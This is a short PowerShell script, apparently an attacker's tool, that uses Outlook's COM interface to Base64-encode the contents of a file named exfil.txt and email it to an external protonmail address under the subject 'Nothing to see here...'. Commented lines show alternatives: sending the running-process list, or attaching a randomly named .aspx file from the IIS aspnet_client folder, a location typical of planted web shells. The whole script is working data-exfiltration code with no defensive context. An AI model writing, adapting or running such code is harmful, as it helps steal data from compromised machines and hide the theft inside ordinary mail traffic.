

$Outlook = New-Object -ComObject Outlook.Application
$Mail = $Outlook.CreateItem(0)
$Mail.To = "hannilen@protonmail.com"
$Mail.Subject = "Nothing to see here... "
#$content = Invoke-Command {Get-Process}
$content = Get-Content exfil.txt

#Base64 Encoder
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($content)
$EncodedText =[Convert]::ToBase64String($Bytes)
#$EncodedText

$Mail.Body = $EncodedText
#attachments
$file = "\\localhost\c$\inetpub\wwwroot\aspnet_client\lftrlmcoqbxceued.aspx"
#$Mail.Attachments.Add($file);
#send message
$Mail.Send()
#quit and cleanup
#$Outlook.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
